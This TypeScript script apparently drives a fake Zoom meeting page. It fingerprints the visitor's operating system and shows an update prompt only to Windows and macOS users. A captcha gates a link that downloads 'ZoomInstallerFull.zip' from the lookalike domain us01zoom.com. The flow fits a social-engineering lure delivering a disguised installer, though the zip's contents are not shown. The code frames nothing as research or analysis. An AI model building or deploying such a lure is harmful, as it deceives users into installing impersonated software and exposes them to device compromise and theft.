import platform from 'platform';

declare global {
	interface Window {
		turnstile: any;
	}
}

const textBad = document.getElementById('hidden-text-bad') as HTMLParagraphElement
const captchaText = document.getElementById('captcha-text') as HTMLParagraphElement
const updateLink = document.getElementById('update-link') as HTMLAnchorElement
const meetingBtn = document.getElementById('meeting-btn') as HTMLButtonElement
const hiddenText = document.getElementById('hidden-text-good') as HTMLParagraphElement
const tos = document.getElementById('tos') as HTMLHeadingElement

const osCategory: string = getOSCategory()


function getOSCategory() {
	const os = platform.os;
	if (!os || !os.family) return 'Unknown OS';

	if (os.family === 'Windows') {
		return 'Windows';
	}

	if (os.family === 'OS X' || os.family === 'macOS') {
		const versionStr = os.version || '';
		const majorVersion = parseInt(versionStr.split('.')[0], 10);

		if (!isNaN(majorVersion)) {
			return majorVersion < 15 ? 'macOS < 15' : 'macOS >= 15';
		} else {
			return 'macOS (unknown version)';
		}
	}

	if (os.family.startsWith("Linux")) {
		return "Linux"
	}

	return 'Other OS';
}

meetingBtn.addEventListener('click', function() {

	tos.style.display = 'none'

	meetingBtn.style.opacity = '0.65'
	meetingBtn.style.pointerEvents = 'none'
	meetingBtn.style.cursor = 'not-allowed'

	if (osCategory.includes("Windows") || osCategory.includes("macOS")) {
		hiddenText.style.display = 'block'
		return
	} else if (osCategory.includes("Linux")) {
		textBad.style.display = 'block'
		return
	} else {
		textBad.style.display = 'block'
	}
})

updateLink.addEventListener('click', async function(e) {
	e.preventDefault();

	const token = window.turnstile.getResponse();

	if (!token) {
		captchaText.style.display = "block"
		return
	}

	captchaText.style.display = "none"

	const formData = new FormData();
	formData.append('cf-turnstile-response', token)

	const response = await fetch('/verify-captcha', {
		method: 'POST',
		body: formData,
	});

	const result = await response.json();

	if (result.success) {
		const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}`;
		window.open(downloadUrl, '_blank')
	}
})

